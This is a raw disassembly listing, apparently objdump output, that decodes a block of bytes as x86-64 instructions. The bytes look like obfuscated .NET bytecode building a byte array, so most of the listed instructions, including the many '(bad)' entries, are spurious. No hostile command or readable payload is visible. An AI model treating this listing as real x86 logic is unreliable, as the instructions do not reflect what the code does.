  404667:	20 44 00 00          	and    %al,0x0(%rax,%rax,1)
  40466b:	00 58 fe             	add    %bl,-0x2(%rax)
  40466e:	0e                   	(bad)
  40466f:	1e                   	(bad)
  404670:	00 20                	add    %ah,(%rax)
  404672:	42 01 00             	rex.X add %eax,(%rax)
  404675:	00 38                	add    %bh,(%rax)
  404677:	09 ee                	or     %ebp,%esi
  404679:	ff                   	(bad)
  40467a:	ff                   	(bad)
  40467b:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  40467e:	00 20                	add    %ah,(%rax)
  404680:	03 00                	add    (%rax),%eax
  404682:	00 00                	add    %al,(%rax)
  404684:	fe 0c 1e             	decb   (%rsi,%rbx,1)
  404687:	00 9c 20 ab 00 00 00 	add    %bl,0xab(%rax,%riz,1)
  40468e:	38 e9                	cmp    %ch,%cl
  404690:	ed                   	in     (%dx),%eax
  404691:	ff                   	(bad)
  404692:	ff 11                	call   *(%rcx)
  404694:	08 11                	or     %dl,(%rcx)
  404696:	14 17                	adc    $0x17,%al
  404698:	58                   	pop    %rax
  404699:	11 05 20 00 ff 00    	adc    %eax,0xff0020(%rip)        # 0x13f46bf
  40469f:	00 5f 1e             	add    %bl,0x1e(%rdi)
  4046a2:	64 d2 9c 20 54 01 00 	rcrb   %cl,%fs:0x154(%rax,%riz,1)
  4046a9:	00 
  4046aa:	fe 0e                	decb   (%rsi)
  4046ac:	33 00                	xor    (%rax),%eax
  4046ae:	38 2e                	cmp    %ch,(%rsi)
  4046b0:	23 00                	and    (%rax),%eax
  4046b2:	00 39                	add    %bh,(%rcx)
  4046b4:	c8 ed ff ff          	enter  $0xffed,$0xff
  4046b8:	20 1d 00 00 00 20    	and    %bl,0x20000000(%rip)        # 0x204046be
  4046be:	3c 00                	cmp    $0x0,%al
  4046c0:	00 00                	add    %al,(%rax)
  4046c2:	58                   	pop    %rax
  4046c3:	fe 0e                	decb   (%rsi)
  4046c5:	0c 00                	or     $0x0,%al
  4046c7:	20 24 00             	and    %ah,(%rax,%rax,1)
  4046ca:	00 00                	add    %al,(%rax)
  4046cc:	fe 0e                	decb   (%rsi)
  4046ce:	33 00                	xor    (%rax),%eax
  4046d0:	38 16                	cmp    %dl,(%rsi)
  4046d2:	23 00                	and    (%rax),%eax
  4046d4:	00 3a                	add    %bh,(%rdx)
  4046d6:	7e 0e                	jle    0x4046e6
  4046d8:	00 00                	add    %al,(%rax)
  4046da:	38 a1 ed ff ff 20    	cmp    %ah,0x20ffffed(%rcx)
  4046e0:	10 00                	adc    %al,(%rax)
  4046e2:	00 00                	add    %al,(%rax)
  4046e4:	20 79 00             	and    %bh,0x0(%rcx)
  4046e7:	00 00                	add    %al,(%rax)
  4046e9:	58                   	pop    %rax
  4046ea:	fe 0e                	decb   (%rsi)
  4046ec:	0c 00                	or     $0x0,%al
  4046ee:	20 9f 01 00 00 fe    	and    %bl,-0x1ffffff(%rdi)
  4046f4:	0e                   	(bad)
  4046f5:	33 00                	xor    (%rax),%eax
  4046f7:	17                   	(bad)
  4046f8:	3a 83 ed ff ff 20    	cmp    0x20ffffed(%rbx),%al
  4046fe:	e5 00                	in     $0x0,%eax
  404700:	00 00                	add    %al,(%rax)
  404702:	20 4c 00 00          	and    %cl,0x0(%rax,%rax,1)
  404706:	00 59 fe             	add    %bl,-0x2(%rcx)
  404709:	0e                   	(bad)
  40470a:	2b 00                	sub    (%rax),%eax
  40470c:	20 12                	and    %dl,(%rdx)
  40470e:	01 00                	add    %eax,(%rax)
  404710:	00 38                	add    %bh,(%rax)
  404712:	66 ed                	in     (%dx),%ax
  404714:	ff                   	(bad)
  404715:	ff 20                	jmp    *(%rax)
  404717:	7a 00                	jp     0x404719
  404719:	00 00                	add    %al,(%rax)
  40471b:	20 4a 00             	and    %cl,0x0(%rdx)
  40471e:	00 00                	add    %al,(%rax)
  404720:	58                   	pop    %rax
  404721:	fe 0e                	decb   (%rsi)
  404723:	2b 00                	sub    (%rax),%eax
  404725:	20 9b 01 00 00 38    	and    %bl,0x38000001(%rbx)
  40472b:	4d ed                	rex.WRB in (%dx),%eax
  40472d:	ff                   	(bad)
  40472e:	ff                   	(bad)
  40472f:	fe 0c 27             	decb   (%rdi,%riz,1)
  404732:	00 20                	add    %ah,(%rax)
  404734:	04 00                	add    $0x0,%al
  404736:	00 00                	add    %al,(%rax)
  404738:	20 25 00 00 00 20    	and    %ah,0x20000000(%rip)        # 0x2040473e
  40473e:	04 00                	add    $0x0,%al
  404740:	00 00                	add    %al,(%rax)
  404742:	58                   	pop    %rax
  404743:	9c                   	pushf
  404744:	20 50 00             	and    %dl,0x0(%rax)
  404747:	00 00                	add    %al,(%rax)
  404749:	38 2e                	cmp    %ch,(%rsi)
  40474b:	ed                   	in     (%dx),%eax
  40474c:	ff                   	(bad)
  40474d:	ff                   	(bad)
  40474e:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  404751:	00 20                	add    %ah,(%rax)
  404753:	04 00                	add    $0x0,%al
  404755:	00 00                	add    %al,(%rax)
  404757:	20 6f 00             	and    %ch,0x0(%rdi)
  40475a:	00 00                	add    %al,(%rax)
  40475c:	20 0e                	and    %cl,(%rsi)
  40475e:	00 00                	add    %al,(%rax)
  404760:	00 58 9c             	add    %bl,-0x64(%rax)
  404763:	20 d3                	and    %dl,%bl
  404765:	00 00                	add    %al,(%rax)
  404767:	00 38                	add    %bh,(%rax)
  404769:	17                   	(bad)
  40476a:	ed                   	in     (%dx),%eax
  40476b:	ff                   	(bad)
  40476c:	ff                   	(bad)
  40476d:	fe 0c 27             	decb   (%rdi,%riz,1)
  404770:	00 20                	add    %ah,(%rax)
  404772:	0d 00 00 00 fe       	or     $0xfe000000,%eax
  404777:	0c 2b                	or     $0x2b,%al
  404779:	00 9c 20 f7 00 00 00 	add    %bl,0xf7(%rax,%riz,1)
  404780:	fe 0e                	decb   (%rsi)
  404782:	33 00                	xor    (%rax),%eax
  404784:	16                   	(bad)
  404785:	39 f6                	cmp    %esi,%esi
  404787:	ec                   	in     (%dx),%al
  404788:	ff                   	(bad)
  404789:	ff 16                	call   *(%rsi)
  40478b:	13 1c 20             	adc    (%rax,%riz,1),%ebx
  40478e:	28 01                	sub    %al,(%rcx)
  404790:	00 00                	add    %al,(%rax)
  404792:	fe 0e                	decb   (%rsi)
  404794:	33 00                	xor    (%rax),%eax
  404796:	38 e5                	cmp    %ah,%ch
  404798:	ec                   	in     (%dx),%al
  404799:	ff                   	(bad)
  40479a:	ff                   	(bad)
  40479b:	fe 0c 27             	decb   (%rdi,%riz,1)
  40479e:	00 20                	add    %ah,(%rax)
  4047a0:	04 00                	add    $0x0,%al
  4047a2:	00 00                	add    %al,(%rax)
  4047a4:	20 f1                	and    %dh,%cl
  4047a6:	00 00                	add    %al,(%rax)
  4047a8:	00 20                	add    %ah,(%rax)
  4047aa:	50                   	push   %rax
  4047ab:	00 00                	add    %al,(%rax)
  4047ad:	00 59 9c             	add    %bl,-0x64(%rcx)
  4047b0:	20 03                	and    %al,(%rbx)
  4047b2:	00 00                	add    %al,(%rax)
  4047b4:	00 38                	add    %bh,(%rax)
  4047b6:	c2 ec ff             	ret    $0xffec
  4047b9:	ff                   	(bad)
  4047ba:	fe 0c 27             	decb   (%rdi,%riz,1)
  4047bd:	00 20                	add    %ah,(%rax)
  4047bf:	1b 00                	sbb    (%rax),%eax
  4047c1:	00 00                	add    %al,(%rax)
  4047c3:	fe 0c 2b             	decb   (%rbx,%rbp,1)
  4047c6:	00 9c 20 7b 01 00 00 	add    %bl,0x17b(%rax,%riz,1)
  4047cd:	fe 0e                	decb   (%rsi)
  4047cf:	33 00                	xor    (%rax),%eax
  4047d1:	16                   	(bad)
  4047d2:	39 a9 ec ff ff 20    	cmp    %ebp,0x20ffffec(%rcx)
  4047d8:	3b 00                	cmp    (%rax),%eax
  4047da:	00 00                	add    %al,(%rax)
  4047dc:	20 5b 00             	and    %bl,0x0(%rbx)
  4047df:	00 00                	add    %al,(%rax)
  4047e1:	58                   	pop    %rax
  4047e2:	fe 0e                	decb   (%rsi)
  4047e4:	2b 00                	sub    (%rax),%eax
  4047e6:	20 f2                	and    %dh,%dl
  4047e8:	00 00                	add    %al,(%rax)
  4047ea:	00 38                	add    %bh,(%rax)
  4047ec:	8c ec                	mov    %gs,%esp
  4047ee:	ff                   	(bad)
  4047ef:	ff 11                	call   *(%rcx)
  4047f1:	18 8e 69 1a 5b 13    	sbb    %cl,0x135b1a69(%rsi)
  4047f7:	2d 20 d6 00 00       	sub    $0xd620,%eax
  4047fc:	00 38                	add    %bh,(%rax)
  4047fe:	82                   	(bad)
  4047ff:	ec                   	in     (%dx),%al
  404800:	ff                   	(bad)
  404801:	ff                   	(bad)
  404802:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  404805:	00 20                	add    %ah,(%rax)
  404807:	01 00                	add    %eax,(%rax)
  404809:	00 00                	add    %al,(%rax)
  40480b:	20 38                	and    %bh,(%rax)
  40480d:	00 00                	add    %al,(%rax)
  40480f:	00 20                	add    %ah,(%rax)
  404811:	64 00 00             	add    %al,%fs:(%rax)
  404814:	00 58 9c             	add    %bl,-0x64(%rax)
  404817:	20 25 01 00 00 fe    	and    %ah,-0x1ffffff(%rip)        # 0xfffffffffe40481e
  40481d:	0e                   	(bad)
  40481e:	33 00                	xor    (%rax),%eax
  404820:	38 5b ec             	cmp    %bl,-0x14(%rbx)
  404823:	ff                   	(bad)
  404824:	ff                   	(bad)
  404825:	fe 0c 27             	decb   (%rdi,%riz,1)
  404828:	00 20                	add    %ah,(%rax)
  40482a:	1e                   	(bad)
  40482b:	00 00                	add    %al,(%rax)
  40482d:	00 20                	add    %ah,(%rax)
  40482f:	ad                   	lods   (%rsi),%eax
  404830:	00 00                	add    %al,(%rax)
  404832:	00 20                	add    %ah,(%rax)
  404834:	39 00                	cmp    %eax,(%rax)
  404836:	00 00                	add    %al,(%rax)
  404838:	59                   	pop    %rcx
  404839:	9c                   	pushf
  40483a:	20 af 00 00 00 38    	and    %ch,0x38000000(%rdi)
  404840:	40 ec                	rex in (%dx),%al
  404842:	ff                   	(bad)
  404843:	ff                   	(bad)
  404844:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  404847:	00 20                	add    %ah,(%rax)
  404849:	05 00 00 00 20       	add    $0x20000000,%eax
  40484e:	03 00                	add    (%rax),%eax
  404850:	00 00                	add    %al,(%rax)
  404852:	20 36                	and    %dh,(%rsi)
  404854:	00 00                	add    %al,(%rax)
  404856:	00 58 9c             	add    %bl,-0x64(%rax)
  404859:	20 08                	and    %cl,(%rax)
  40485b:	01 00                	add    %eax,(%rax)
  40485d:	00 38                	add    %bh,(%rax)
  40485f:	19 ec                	sbb    %ebp,%esp
  404861:	ff                   	(bad)
  404862:	ff                   	(bad)
  404863:	fe 0c 27             	decb   (%rdi,%riz,1)
  404866:	00 20                	add    %ah,(%rax)
  404868:	15 00 00 00 fe       	adc    $0xfe000000,%eax
  40486d:	0c 2b                	or     $0x2b,%al
  40486f:	00 9c 20 ec 00 00 00 	add    %bl,0xec(%rax,%riz,1)
  404876:	38 09                	cmp    %cl,(%rcx)
  404878:	ec                   	in     (%dx),%al
  404879:	ff                   	(bad)
  40487a:	ff 20                	jmp    *(%rax)
  40487c:	87 00                	xchg   %eax,(%rax)
  40487e:	00 00                	add    %al,(%rax)
  404880:	20 43 00             	and    %al,0x0(%rbx)
  404883:	00 00                	add    %al,(%rax)
  404885:	59                   	pop    %rcx
  404886:	fe 0e                	decb   (%rsi)
  404888:	1e                   	(bad)
  404889:	00 20                	add    %ah,(%rax)
  40488b:	53                   	push   %rbx
  40488c:	01 00                	add    %eax,(%rax)
  40488e:	00 38                	add    %bh,(%rax)
  404890:	e8 eb ff ff 20       	call   0x21404880
  404895:	3c 00                	cmp    $0x0,%al
  404897:	00 00                	add    %al,(%rax)
  404899:	20 30                	and    %dh,(%rax)
  40489b:	00 00                	add    %al,(%rax)
  40489d:	00 58 fe             	add    %bl,-0x2(%rax)
  4048a0:	0e                   	(bad)
  4048a1:	1e                   	(bad)
  4048a2:	00 20                	add    %ah,(%rax)
  4048a4:	cc                   	int3
  4048a5:	00 00                	add    %al,(%rax)
  4048a7:	00 fe                	add    %bh,%dh
  4048a9:	0e                   	(bad)
  4048aa:	33 00                	xor    (%rax),%eax
  4048ac:	16                   	(bad)
  4048ad:	39 ce                	cmp    %ecx,%esi
  4048af:	eb ff                	jmp    0x4048b0
  4048b1:	ff 11                	call   *(%rcx)
  4048b3:	24 8e                	and    $0x8e,%al
  4048b5:	69 1a 5b 13 01 20    	imul   $0x2001135b,(%rdx),%ebx
  4048bb:	0b 01                	or     (%rcx),%eax
  4048bd:	00 00                	add    %al,(%rax)
  4048bf:	fe 0e                	decb   (%rsi)
  4048c1:	33 00                	xor    (%rax),%eax
  4048c3:	38 b8 eb ff ff 20    	cmp    %bh,0x20ffffeb(%rax)
  4048c9:	0e                   	(bad)
  4048ca:	00 00                	add    %al,(%rax)
  4048cc:	00 20                	add    %ah,(%rax)
  4048ce:	69 00 00 00 58 fe    	imul   $0xfe580000,(%rax),%eax
  4048d4:	0e                   	(bad)
  4048d5:	2b 00                	sub    (%rax),%eax
  4048d7:	20 e2                	and    %ah,%dl
  4048d9:	00 00                	add    %al,(%rax)
  4048db:	00 38                	add    %bh,(%rax)
  4048dd:	9b                   	fwait
  4048de:	eb ff                	jmp    0x4048df
  4048e0:	ff 16                	call   *(%rsi)
  4048e2:	13 09                	adc    (%rcx),%ecx
  4048e4:	20 0c 01             	and    %cl,(%rcx,%rax,1)
  4048e7:	00 00                	add    %al,(%rax)
  4048e9:	fe 0e                	decb   (%rsi)
  4048eb:	33 00                	xor    (%rax),%eax
  4048ed:	17                   	(bad)
  4048ee:	3a 8d eb ff ff 20    	cmp    0x20ffffeb(%rbp),%cl
  4048f4:	61                   	(bad)
  4048f5:	00 00                	add    %al,(%rax)
  4048f7:	00 20                	add    %ah,(%rax)
  4048f9:	4f 00 00             	rex.WRXB add %r8b,(%r8)
  4048fc:	00 58 fe             	add    %bl,-0x2(%rax)
  4048ff:	0e                   	(bad)
  404900:	0c 00                	or     $0x0,%al
  404902:	20 8c 00 00 00 fe 0e 	and    %cl,0xefe0000(%rax,%rax,1)
  404909:	33 00                	xor    (%rax),%eax
  40490b:	16                   	(bad)
  40490c:	39 6f eb             	cmp    %ebp,-0x15(%rdi)
  40490f:	ff                   	(bad)
  404910:	ff                   	(bad)
  404911:	fe 0c 27             	decb   (%rdi,%riz,1)
  404914:	00 20                	add    %ah,(%rax)
  404916:	03 00                	add    (%rax),%eax
  404918:	00 00                	add    %al,(%rax)
  40491a:	20 a3 00 00 00 20    	and    %ah,0x20000000(%rbx)
  404920:	36 00 00             	ss add %al,(%rax)
  404923:	00 59 9c             	add    %bl,-0x64(%rcx)
  404926:	20 95 00 00 00 38    	and    %dl,0x38000000(%rbp)
  40492c:	4c eb ff             	rex.WR jmp 0x40492e
  40492f:	ff 20                	jmp    *(%rax)
  404931:	80 00 00             	addb   $0x0,(%rax)
  404934:	00 20                	add    %ah,(%rax)
  404936:	2a 00                	sub    (%rax),%al
  404938:	00 00                	add    %al,(%rax)
  40493a:	59                   	pop    %rcx
  40493b:	fe 0e                	decb   (%rsi)
  40493d:	1e                   	(bad)
  40493e:	00 20                	add    %ah,(%rax)
  404940:	62 01 00 00 38       	(bad)
  404945:	33 eb                	xor    %ebx,%ebp
  404947:	ff                   	(bad)
  404948:	ff 11                	call   *(%rcx)
  40494a:	1b 17                	sbb    (%rdi),%edx
  40494c:	58                   	pop    %rax
  40494d:	13 1b                	adc    (%rbx),%ebx
  40494f:	20 a3 01 00 00 38    	and    %ah,0x38000001(%rbx)
  404955:	23 eb                	and    %ebx,%ebp
  404957:	ff                   	(bad)
  404958:	ff                   	(bad)
  404959:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  40495c:	00 20                	add    %ah,(%rax)
  40495e:	00 00                	add    %al,(%rax)
  404960:	00 00                	add    %al,(%rax)
  404962:	20 8c 00 00 00 20 1f 	and    %cl,0x1f200000(%rax,%rax,1)
  404969:	00 00                	add    %al,(%rax)
  40496b:	00 59 9c             	add    %bl,-0x64(%rcx)
  40496e:	20 8d 01 00 00 fe    	and    %cl,-0x1ffffff(%rbp)
  404974:	0e                   	(bad)
  404975:	33 00                	xor    (%rax),%eax
  404977:	38 04 eb             	cmp    %al,(%rbx,%rbp,8)
  40497a:	ff                   	(bad)
  40497b:	ff 11                	call   *(%rcx)
  40497d:	00 38                	add    %bh,(%rax)
  40497f:	72 20                	jb     0x4049a1
  404981:	00 00                	add    %al,(%rax)
  404983:	80 08 00             	orb    $0x0,(%rax)
  404986:	00 04 20             	add    %al,(%rax,%riz,1)
  404989:	4c 01 00             	add    %r8,(%rax)
  40498c:	00 38                	add    %bh,(%rax)
  40498e:	ea                   	(bad)
  40498f:	ea                   	(bad)
  404990:	ff                   	(bad)
  404991:	ff 11                	call   *(%rcx)
  404993:	0e                   	(bad)
  404994:	11 24 11             	adc    %esp,(%rcx,%rdx,1)
  404997:	24 8e                	and    $0x8e,%al
  404999:	69 17 11 2c 58 59    	imul   $0x59582c11,(%rdi),%edx
  40499f:	91                   	xchg   %eax,%ecx
  4049a0:	60                   	(bad)
  4049a1:	13 0e                	adc    (%rsi),%ecx
  4049a3:	20 c7                	and    %al,%bh
  4049a5:	00 00                	add    %al,(%rax)
  4049a7:	00 fe                	add    %bh,%dh
  4049a9:	0e                   	(bad)
  4049aa:	33 00                	xor    (%rax),%eax
  4049ac:	38 cf                	cmp    %cl,%bh
  4049ae:	ea                   	(bad)
  4049af:	ff                   	(bad)
  4049b0:	ff 20                	jmp    *(%rax)
  4049b2:	ab                   	stos   %eax,(%rdi)
  4049b3:	00 00                	add    %al,(%rax)
  4049b5:	00 20                	add    %ah,(%rax)
  4049b7:	39 00                	cmp    %eax,(%rax)
  4049b9:	00 00                	add    %al,(%rax)
  4049bb:	59                   	pop    %rcx
  4049bc:	fe 0e                	decb   (%rsi)
  4049be:	2b 00                	sub    (%rax),%eax
  4049c0:	20 40 00             	and    %al,0x0(%rax)
  4049c3:	00 00                	add    %al,(%rax)
  4049c5:	fe 0e                	decb   (%rsi)
  4049c7:	33 00                	xor    (%rax),%eax
  4049c9:	38 31                	cmp    %dh,(%rcx)
  4049cb:	20 00                	and    %al,(%rax)
  4049cd:	00 3a                	add    %bh,(%rdx)
  4049cf:	ad                   	lods   (%rsi),%eax
  4049d0:	ea                   	(bad)
  4049d1:	ff                   	(bad)
  4049d2:	ff 11                	call   *(%rcx)
  4049d4:	20 38                	and    %bh,(%rax)
  4049d6:	2f                   	(bad)
  4049d7:	20 00                	and    %al,(%rax)
  4049d9:	00 16                	add    %dl,(%rsi)
  4049db:	6a 38                	push   $0x38
  4049dd:	32 20                	xor    (%rax),%ah
  4049df:	00 00                	add    %al,(%rax)
  4049e1:	20 73 00             	and    %dh,0x0(%rbx)
  4049e4:	00 00                	add    %al,(%rax)
  4049e6:	fe 0e                	decb   (%rsi)
  4049e8:	33 00                	xor    (%rax),%eax
  4049ea:	16                   	(bad)
  4049eb:	39 90 ea ff ff 11    	cmp    %edx,0x11ffffea(%rax)
  4049f1:	28 11                	sub    %dl,(%rcx)
  4049f3:	01 17                	add    %edx,(%rdi)
  4049f5:	59                   	pop    %rcx
  4049f6:	40 23 0b             	rex and (%rbx),%ecx
  4049f9:	00 00                	add    %al,(%rax)
  4049fb:	20 a6 01 00 00 38    	and    %ah,0x38000001(%rsi)
  404a01:	77 ea                	ja     0x4049ed
  404a03:	ff                   	(bad)
  404a04:	ff                   	(bad)
  404a05:	fe 0c 27             	decb   (%rdi,%riz,1)
  404a08:	00 20                	add    %ah,(%rax)
  404a0a:	0b 00                	or     (%rax),%eax
  404a0c:	00 00                	add    %al,(%rax)
  404a0e:	fe 0c 2b             	decb   (%rbx,%rbp,1)
  404a11:	00 9c 20 a8 01 00 00 	add    %bl,0x1a8(%rax,%riz,1)
  404a18:	38 5f ea             	cmp    %bl,-0x16(%rdi)
  404a1b:	ff                   	(bad)
  404a1c:	ff                   	(bad)
  404a1d:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  404a20:	00 20                	add    %ah,(%rax)
  404a22:	08 00                	or     %al,(%rax)
  404a24:	00 00                	add    %al,(%rax)
  404a26:	20 45 00             	and    %al,0x0(%rbp)
  404a29:	00 00                	add    %al,(%rax)
  404a2b:	20 43 00             	and    %al,0x0(%rbx)
  404a2e:	00 00                	add    %al,(%rax)
  404a30:	59                   	pop    %rcx
  404a31:	9c                   	pushf
  404a32:	20 cd                	and    %cl,%ch
  404a34:	00 00                	add    %al,(%rax)
  404a36:	00 fe                	add    %bh,%dh
  404a38:	0e                   	(bad)
  404a39:	33 00                	xor    (%rax),%eax
  404a3b:	38 dd                	cmp    %bl,%ch
  404a3d:	1f                   	(bad)
  404a3e:	00 00                	add    %al,(%rax)
  404a40:	39 3b                	cmp    %edi,(%rbx)
  404a42:	ea                   	(bad)
  404a43:	ff                   	(bad)
  404a44:	ff                   	(bad)
  404a45:	7e 08                	jle    0x404a4f
  404a47:	00 00                	add    %al,(%rax)
  404a49:	04 02                	add    $0x2,%al
  404a4b:	38 d7                	cmp    %dl,%bh
  404a4d:	1f                   	(bad)
  404a4e:	00 00                	add    %al,(%rax)
  404a50:	13 23                	adc    (%rbx),%esp
  404a52:	20 af 01 00 00 fe    	and    %ch,-0x1ffffff(%rdi)
  404a58:	0e                   	(bad)
  404a59:	33 00                	xor    (%rax),%eax
  404a5b:	38 20                	cmp    %ah,(%rax)
  404a5d:	ea                   	(bad)
  404a5e:	ff                   	(bad)
  404a5f:	ff                   	(bad)
  404a60:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  404a63:	00 20                	add    %ah,(%rax)
  404a65:	03 00                	add    (%rax),%eax
  404a67:	00 00                	add    %al,(%rax)
  404a69:	20 7f 00             	and    %bh,0x0(%rdi)
  404a6c:	00 00                	add    %al,(%rax)
  404a6e:	20 52 00             	and    %dl,0x0(%rdx)
  404a71:	00 00                	add    %al,(%rax)
  404a73:	58                   	pop    %rax
  404a74:	9c                   	pushf
  404a75:	20 5f 00             	and    %bl,0x0(%rdi)
  404a78:	00 00                	add    %al,(%rax)
  404a7a:	38 05 ea ff ff fe    	cmp    %al,-0x1000016(%rip)        # 0xffffffffff404a6a
  404a80:	0c 2f                	or     $0x2f,%al
  404a82:	00 20                	add    %ah,(%rax)
  404a84:	09 00                	or     %eax,(%rax)
  404a86:	00 00                	add    %al,(%rax)
  404a88:	fe 0c 1e             	decb   (%rsi,%rbx,1)
  404a8b:	00 9c 20 c4 00 00 00 	add    %bl,0xc4(%rax,%riz,1)
  404a92:	fe 0e                	decb   (%rsi)
  404a94:	33 00                	xor    (%rax),%eax
  404a96:	38 e5                	cmp    %ah,%ch
  404a98:	e9 ff ff 20 42       	jmp    0x42614a9c
  404a9d:	00 00                	add    %al,(%rax)
  404a9f:	00 20                	add    %ah,(%rax)
  404aa1:	50                   	push   %rax
  404aa2:	00 00                	add    %al,(%rax)
  404aa4:	00 58 fe             	add    %bl,-0x2(%rax)
  404aa7:	0e                   	(bad)
  404aa8:	2b 00                	sub    (%rax),%eax
  404aaa:	20 84 00 00 00 38 c8 	and    %al,-0x37c80000(%rax,%rax,1)
  404ab1:	e9 ff ff fe 0c       	jmp    0xd3f4ab5
  404ab6:	27                   	(bad)
  404ab7:	00 20                	add    %ah,(%rax)
  404ab9:	05 00 00 00 fe       	add    $0xfe000000,%eax
  404abe:	0c 0c                	or     $0xc,%al
  404ac0:	00 9c 20 a9 00 00 00 	add    %bl,0xa9(%rax,%riz,1)
  404ac7:	38 b0 e9 ff ff fe    	cmp    %dh,-0x1000017(%rax)
  404acd:	0c 27                	or     $0x27,%al
  404acf:	00 20                	add    %ah,(%rax)
  404ad1:	05 00 00 00 20       	add    $0x20000000,%eax
  404ad6:	95                   	xchg   %eax,%ebp
  404ad7:	00 00                	add    %al,(%rax)
  404ad9:	00 20                	add    %ah,(%rax)
  404adb:	31 00                	xor    %eax,(%rax)
  404add:	00 00                	add    %al,(%rax)
  404adf:	59                   	pop    %rcx
  404ae0:	9c                   	pushf
  404ae1:	20 c1                	and    %al,%cl
  404ae3:	00 00                	add    %al,(%rax)
  404ae5:	00 fe                	add    %bh,%dh
  404ae7:	0e                   	(bad)
  404ae8:	33 00                	xor    (%rax),%eax
  404aea:	38 91 e9 ff ff fe    	cmp    %dl,-0x1000017(%rcx)
  404af0:	0c 27                	or     $0x27,%al
  404af2:	00 20                	add    %ah,(%rax)
  404af4:	11 00                	adc    %eax,(%rax)
  404af6:	00 00                	add    %al,(%rax)
  404af8:	20 e0                	and    %ah,%al
  404afa:	00 00                	add    %al,(%rax)
  404afc:	00 20                	add    %ah,(%rax)
  404afe:	4a 00 00             	rex.WX add %al,(%rax)
  404b01:	00 59 9c             	add    %bl,-0x64(%rcx)
  404b04:	20 4e 01             	and    %cl,0x1(%rsi)
  404b07:	00 00                	add    %al,(%rax)
  404b09:	38 76 e9             	cmp    %dh,-0x17(%rsi)
  404b0c:	ff                   	(bad)
  404b0d:	ff 20                	jmp    *(%rax)
  404b0f:	4e 00 00             	rex.WRX add %r8b,(%rax)
  404b12:	00 20                	add    %ah,(%rax)
  404b14:	1e                   	(bad)
  404b15:	00 00                	add    %al,(%rax)
  404b17:	00 59 fe             	add    %bl,-0x2(%rcx)
  404b1a:	0e                   	(bad)
  404b1b:	1e                   	(bad)
  404b1c:	00 20                	add    %ah,(%rax)
  404b1e:	09 00                	or     %eax,(%rax)
  404b20:	00 00                	add    %al,(%rax)
  404b22:	38 55 e9             	cmp    %dl,-0x17(%rbp)
  404b25:	ff                   	(bad)
  404b26:	ff 11                	call   *(%rcx)
  404b28:	1b 11                	sbb    (%rcx),%edx
  404b2a:	1d 3f 72 f8 ff       	sbb    $0xfff8723f,%eax
  404b2f:	ff 20                	jmp    *(%rax)
  404b31:	bf 00 00 00 38       	mov    $0x38000000,%edi
  404b36:	4a e9 ff ff 20 6b    	rex.WX jmp 0x6b614b3b
  404b3c:	00 00                	add    %al,(%rax)
  404b3e:	00 20                	add    %ah,(%rax)
  404b40:	32 00                	xor    (%rax),%al
  404b42:	00 00                	add    %al,(%rax)
  404b44:	58                   	pop    %rax
  404b45:	fe 0e                	decb   (%rsi)
  404b47:	2b 00                	sub    (%rax),%eax
  404b49:	20 d0                	and    %dl,%al
  404b4b:	00 00                	add    %al,(%rax)
  404b4d:	00 38                	add    %bh,(%rax)
  404b4f:	29 e9                	sub    %ebp,%ecx
  404b51:	ff                   	(bad)
  404b52:	ff 11                	call   *(%rcx)
  404b54:	01 17                	add    %edx,(%rdi)
  404b56:	58                   	pop    %rax
  404b57:	13 01                	adc    (%rcx),%eax
  404b59:	20 1f                	and    %bl,(%rdi)
  404b5b:	00 00                	add    %al,(%rax)
  404b5d:	00 fe                	add    %bh,%dh
  404b5f:	0e                   	(bad)
  404b60:	33 00                	xor    (%rax),%eax
  404b62:	17                   	(bad)
  404b63:	3a 18                	cmp    (%rax),%bl
  404b65:	e9 ff ff fe 0c       	jmp    0xd3f4b69
  404b6a:	2f                   	(bad)
  404b6b:	00 20                	add    %ah,(%rax)
  404b6d:	07                   	(bad)
  404b6e:	00 00                	add    %al,(%rax)
  404b70:	00 20                	add    %ah,(%rax)
  404b72:	bf 00 00 00 20       	mov    $0x20000000,%edi
  404b77:	49 00 00             	rex.WB add %al,(%r8)
  404b7a:	00 59 9c             	add    %bl,-0x64(%rcx)
  404b7d:	20 1e                	and    %bl,(%rsi)
  404b7f:	00 00                	add    %al,(%rax)
  404b81:	00 38                	add    %bh,(%rax)
  404b83:	f5                   	cmc
  404b84:	e8 ff ff fe 0c       	call   0xd3f4b88
  404b89:	27                   	(bad)
  404b8a:	00 20                	add    %ah,(%rax)
  404b8c:	1d 00 00 00 20       	sbb    $0x20000000,%eax
  404b91:	bc 00 00 00 20       	mov    $0x20000000,%esp
  404b96:	3e 00 00             	ds add %al,(%rax)
  404b99:	00 59 9c             	add    %bl,-0x64(%rcx)
  404b9c:	20 49 00             	and    %cl,0x0(%rcx)
  404b9f:	00 00                	add    %al,(%rax)
  404ba1:	fe 0e                	decb   (%rsi)
  404ba3:	33 00                	xor    (%rax),%eax
  404ba5:	38 d6                	cmp    %dl,%dh
  404ba7:	e8 ff ff fe 0c       	call   0xd3f4bab
  404bac:	2f                   	(bad)
  404bad:	00 20                	add    %ah,(%rax)
  404baf:	0d 00 00 00 fe       	or     $0xfe000000,%eax
  404bb4:	0c 1e                	or     $0x1e,%al
  404bb6:	00 9c 20 77 01 00 00 	add    %bl,0x177(%rax,%riz,1)
  404bbd:	fe 0e                	decb   (%rsi)
  404bbf:	33 00                	xor    (%rax),%eax
  404bc1:	38 6b 1e             	cmp    %ch,0x1e(%rbx)
  404bc4:	00 00                	add    %al,(%rax)
  404bc6:	39 cb                	cmp    %ecx,%ebx
  404bc8:	15 00 00 38 b0       	adc    $0xb0380000,%eax
  404bcd:	e8 ff ff 11 28       	call   0x28524bd1
  404bd2:	1a 5a 13             	sbb    0x13(%rdx),%bl
  404bd5:	14 20                	adc    $0x20,%al
  404bd7:	7d 01                	jge    0x404bda
  404bd9:	00 00                	add    %al,(%rax)
  404bdb:	fe 0e                	decb   (%rsi)
  404bdd:	33 00                	xor    (%rax),%eax
  404bdf:	16                   	(bad)
  404be0:	39 9b e8 ff ff 11    	cmp    %ebx,0x11ffffe8(%rbx)
  404be6:	08 11                	or     %dl,(%rcx)
  404be8:	14 19                	adc    $0x19,%al
  404bea:	58                   	pop    %rax
  404beb:	11 05 20 00 00 00    	adc    %eax,0x20(%rip)        # 0x404c11
